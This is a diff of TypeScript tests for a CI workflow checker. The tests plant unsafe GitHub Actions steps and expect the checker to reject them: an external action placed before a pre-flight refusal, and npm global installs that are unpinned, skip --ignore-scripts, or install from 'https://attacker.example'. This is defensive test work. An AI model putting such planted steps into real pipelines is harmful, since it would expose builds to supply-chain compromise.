@@ -706,7 +706,7 @@ interface Declaration {
     dependencyConditions?: Record<string, string>;
     gateOutputs?: Record<string, Record<string, string>>;
     commandFiles?: string[];
-    preflight?: { job?: string; step?: string };
+    preflight?: { job?: string; step?: string; mayPrecede?: string[] };
     gatedVerifications?: Record<string, string>;
     nestedActions?: string[];
   }[];
@@ -3027,6 +3027,99 @@ describe("the pre-flight refusal runs before anything can disable it", () => {
     }
   });
 
+  it("reports an external action ahead of the pre-flight", () => {
+    // Review finding [94]. The order check counted `run:` and local `uses:` as work and treated
+    // everything else as inert, so `uses: attacker/action@<sha>` could sit before the refusal.
+    // `action-pin` proves such a reference is immutable and says nothing about what it does — and
+    // an action ahead of the pre-flight can write a command file, or replace the very script the
+    // pre-flight is about to run, out of the checkout it just produced.
+    const dir = plantedTree((d) => {
+      const step = firstContext(d).preflight?.step;
+      if (step === undefined) throw new Error("the declaration pins no pre-flight step");
+      editWorkflow(d, firstContext(d).workflow, (text) => {
+        const anchor = `      - name: ${step}`;
+        if (!text.includes(anchor)) throw new Error("the pre-flight step anchor is stale");
+        return text.replace(
+          anchor,
+          "      - uses: planted/action@0000000000000000000000000000000000000000\n" + anchor,
+        );
+      });
+    });
+    try {
+      const run = runLane(dir);
+      expect
+        .soft(
+          run.exitCode,
+          `an external action ahead of the pre-flight must exit 1:\n${run.output}`,
+        )
+        .toBe(1);
+      expect.soft(run.output).toMatch(/which must come first/);
+      expect.soft(run.output).toContain("planted/action@");
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  it("still lets the enumerated checkout precede it, or the pre-flight has nothing to read", () => {
+    // The control, and it is load-bearing rather than decorative: the refusal reads this
+    // repository's files, so the checkout HAS to run first. `mayPrecede` is what says which.
+    const dir = plantedTree(() => undefined);
+    try {
+      const allowed = firstContext(dir).preflight?.mayPrecede ?? [];
+      expect(
+        allowed.length,
+        "the control needs the declaration to allow at least the checkout",
+      ).toBeGreaterThan(0);
+      const run = runLane(dir);
+      expect.soft(run.exitCode, `the tree as it stands must pass:\n${run.output}`).toBe(0);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  it("checks what precedes it against the list rather than against nothing", () => {
+    // Emptying the list must make the SAME tree fail — otherwise the row above is satisfied by a
+    // lane that never looks at what runs before the refusal.
+    const dir = plantedTree((d) => {
+      editDeclaration(d, (decl) => {
+        const context = onlyContext(decl);
+        if (context.preflight === undefined) throw new Error("no preflight to edit");
+        context.preflight.mayPrecede = [];
+        return decl;
+      });
+    });
+    try {
+      const run = runLane(dir);
+      expect
+        .soft(
+          run.exitCode,
+          `an emptied list must refuse the checkout it used to allow:\n${run.output}`,
+        )
+        .toBe(1);
+      expect.soft(run.output).toMatch(/which must come first/);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  it("refuses a pre-flight declaration that says nothing about what may precede it", () => {
+    const dir = plantedTree((d) => {
+      editDeclaration(d, (decl) => {
+        const context = onlyContext(decl);
+        if (context.preflight === undefined) throw new Error("no preflight to edit");
+        delete context.preflight.mayPrecede;
+        return decl;
+      });
+    });
+    try {
+      const run = runLane(dir);
+      expect.soft(run.exitCode, `an absent list must exit 1:\n${run.output}`).toBe(1);
+      expect.soft(run.output).toMatch(/no .?mayPrecede.? list/);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
   it("refuses a declaration that names no pre-flight at all", () => {
     const dir = plantedTree((d) => {
       editDeclaration(d, (decl) => {
@@ -3178,6 +3271,74 @@ describe("a global install names where the package comes from", () => {
       }
     });
   }
+
+  for (const [label, planted] of [
+    [
+      "the pin present only in a comment above an unpinned install",
+      "      - name: Bootstrap something\n        run: |\n          # --registry and --ignore-scripts, explained at length\n          npm install --global corepack@0.35.0\n",
+    ],
+    [
+      "a registry that is not the trusted one",
+      "      - name: Bootstrap something\n        run: npm install --global --ignore-scripts --registry=https://attacker.example corepack@0.35.0\n",
+    ],
+    [
+      "--ignore-scripts turned off",
+      "      - name: Bootstrap something\n        run: npm install --global --ignore-scripts=false --registry https://registry.npmjs.org/ corepack@0.35.0\n",
+    ],
+    [
+      "an alias npm accepts and the first enumeration missed",
+      "      - name: Bootstrap something\n        run: npm in -g corepack@0.35.0\n",
+    ],
+  ] as const) {
+    it(`reports ${label}`, () => {
+      // Review findings [91] and [92]. The first version asked whether the BODY carried the
+      // two flags anywhere — and the body it was written for explains both in a comment
+      // directly above the command, so reverting the command left every substring in place
+      // and the rule green. A flag belongs to an invocation. So does its VALUE: `--registry`
+      // is worth nothing unless what it names is checked, and npm's own alias table has ten
+      // more spellings of `install` than the first enumeration knew.
+      const dir = plantedTree((d) => {
+        editWorkflow(d, firstContext(d).workflow, (text) => {
+          const anchor = "      - name: Run build & pack verification\n";
+          if (!text.includes(anchor)) throw new Error("the build-verify step anchor is stale");
+          return text.replace(anchor, planted + anchor);
+        });
+      });
+      try {
+        const run = runLane(dir);
+        expect.soft(run.exitCode, `${label} must exit 1:\n${run.output}`).toBe(1);
+        expect.soft(run.output, "the finding must name the rule").toContain("global-install-pin");
+      } finally {
+        rmSync(dir, { recursive: true, force: true });
+      }
+    });
+  }
+
+  it("accepts the trusted registry in either spelling, and a trailing slash either way", () => {
+    // The control, in the two forms a shell writer actually uses. A rule accepting only one
+    // of `--registry x` and `--registry=x` would be a rule this repository could not carry,
+    // and a trailing slash is the same registry.
+    for (const planted of [
+      "      - name: Bootstrap something\n        run: npm install --global --ignore-scripts --registry https://registry.npmjs.org/ corepack@0.35.0\n",
+      "      - name: Bootstrap something\n        run: npm i -g --ignore-scripts --registry=https://registry.npmjs.org corepack@0.35.0\n",
+    ]) {
+      const dir = plantedTree((d) => {
+        editWorkflow(d, firstContext(d).workflow, (text) => {
+          const anchor = "      - name: Run build & pack verification\n";
+          if (!text.includes(anchor)) throw new Error("the build-verify step anchor is stale");
+          return text.replace(anchor, planted + anchor);
+        });
+      });
+      try {
+        const run = runLane(dir);
+        expect
+          .soft(run.exitCode, `a fully pinned install must not be a finding:\n${run.output}`)
+          .toBe(0);
+      } finally {
+        rmSync(dir, { recursive: true, force: true });
+      }
+    }
+  });
 
   it("accepts an install that names both, which is the half a blanket refusal would break", () => {
     // The control. The repository's own fallbacks already carry both flags — a lane that refused
